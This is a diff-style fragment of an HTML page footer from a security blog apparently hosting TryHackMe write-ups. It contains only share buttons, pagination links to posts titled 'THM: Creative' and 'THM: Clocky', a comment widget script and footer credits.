+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f04%2fthm-creative%2f;title=THM%3a%20Creative" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=THM%3a%20Creative%20https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f04%2fthm-creative%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f04%2fthm-creative%2f&amp;t=THM%3a%20Creative" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=THM%3a%20Creative&amp;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f04%2fthm-creative%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://scorpiosec.com/fr/posts/2024/04/thm-creative/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">THM: Creative</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="https://scorpiosec.com/fr/posts/2024/04/thm-clocky/">
+                    <span class="button__text">THM: Clocky</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+    
+    <script src="https://utteranc.es/client.js"
+            repo="K-Scorpio/scorpiosec"
+            label="comment"
+            issue-term="pathname"
+            theme="github-dark"
+            crossorigin="anonymous"
+            async>
+    </script>
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2023</span>
+            
+            
+            
+            <span>K-Scorpio</span>
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Theme - <a href="https://themes.gohugo.io/themes/hugo-theme-hello-friend-ng/">Hello Friend NG</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://scorpiosec.com/bundle.min.ac2a4bcaed631ec2dc154407be7f09fc28da37de71fae6dee6711b2a3d1622770f87d3cda22c460e9a68ff619bdb1dd75cb7a5d33f159a54e419736cc4541087.js" integrity="sha512-rCpLyu1jHsLcFUQHvn8J/CjaN95x&#43;ube5nEbKj0WIncPh9PNoixGDppo/2Gb2x3XXLel0z8VmlTkGXNsxFQQhw=="></script>
+
+
+
+
+    </body>
+</html>
